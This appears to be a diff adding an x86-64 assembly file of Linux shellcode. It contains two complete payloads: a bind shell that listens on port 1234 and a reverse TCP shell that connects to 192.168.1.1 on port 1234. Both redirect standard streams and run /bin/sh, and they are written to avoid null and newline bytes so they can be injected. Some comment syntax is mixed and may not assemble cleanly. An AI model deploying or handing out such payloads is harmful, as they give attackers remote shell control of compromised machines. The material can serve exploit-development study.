@@ -1,0 +1,148 @@
+;This is a shellcode for socket server with X64 assembly,  also avoid to use bad characters as following.
+;00: This is the zero value or null terminator (\0)
+;0A: This is the line feed (\n)
+;FF: This is the form feed (\f)
+;0D: This is the carriage return (\r)
+
+
+global _start
+section .text
+_start:
+
+	;sockfd = socket(AF_INET, SOCK_STREAM, 0); //cat unistd_64.h | grep socket
+	xor rax, rax
+	add rax, 41
+	xor rdi, rdi
+	add rdi, 2
+	xor rsi, rsi
+	inc rsi
+	xor rdx, rdx
+	syscall
+
+	mov rdi, rax     //return the sockfd to rdi
+
+	;use python to get related convert value
+	;import socket
+	;hex(socket.htons(1234)) = 0xd204
+	;push the socket parameter such as addr, port, protocol with reverse order.
+	xor rax, rax
+	push rax
+	push word 0xd204
+	push word 0x02
+
+	#bind function
+	mov rsi, rsp   ;the socket parameter from the stack as above step
+	xor rdx, rdx
+	add rdx, 16    ;the length of sockaddr_in
+	xor rax, rax
+	add rax, 49
+	syscall
+
+	;listen function
+	xor rax, rax
+	add rax, 50
+	xor rsi , rsi
+	inc rsi
+	syscall
+
+	;accept function
+	xor rax , rax
+	add rax, 43
+	xor rsi, rsi
+	xor rdx, rdx
+	syscall
+
+	mov rbx, rax   ;save the return client socket to rbx
+
+	;dup the client socket to stdin, stdout, stderr
+	mov rdi, rbx
+	xor rax,rax
+	add rax, 33
+	xor rsi, rsi
+	syscall
+
+	xor rax,rax
+	add rax, 33
+	inc rsi
+	syscall
+
+	xor rax,rax
+	add rax, 33
+	inc rsi
+	syscall
+
+	;invoke execve system call to execute /bin/sh
+	;str ='//bin/sh'
+	;by = bytes(str[::-1],encoding='utf8')
+	;by.hex() = 0x68732f6e69622f2f
+
+	xor rax, rax
+	push rax
+	mov rdx, rsp
+	mov rbx, 0x68732f6e69622f2f
+	push rbx
+	mov rdi, rsp
+	push rax
+	push rdi
+	mov rsi,rsp
+	add rax, 59
+	syscall
+
+
+;Reverse TCP connect shellcode as following
+global _start
+section .text
+_start:
+	;Socket syscall
+	xor rax, rax
+	add rax, 41
+	xor rdi, rdi
+	add rdi, 2
+	xor rsi, rsi
+	inc rsi
+	xor rdx, rdx
+	syscall
+	;Save the sockfd in RDI Register
+	mov rdi, rax
+
+	xor rax, rax
+	push dword 0x0101a8c0 ;socket.inet_aton("192.168.1.1")[::-1] = b'\x01\x01\xa8\xc0'
+	push word 0xd204
+	push word 0x02
+	
+	;Move stack pointer to RSI
+	mov rsi, rsp
+	
+	;Connect syscall
+	xor rdx, rdx
+	add rdx, 16
+	xor rax, rax
+	add rax, 42
+	syscall
+	;invoke Dup2 syscall to stdin, stdout, stderr
+	xor rax,rax
+	add rax, 33
+	xor rsi, rsi
+	syscall
+
+	xor rax,rax
+	add rax, 33
+	inc rsi
+	syscall
+
+	xor rax,rax
+	add rax, 33
+	inc rsi
+	syscall
+	;invoke execve syscall with /bin/sh
+	xor rax, rax
+	push rax
+	mov rdx, rsp
+	mov rbx, 0x68732f6e69622f2f
+	push rbx
+	mov rdi, rsp
+	push rax
+	push rdi
+	mov rsi,rsp
+	add rax, 59
+	syscall
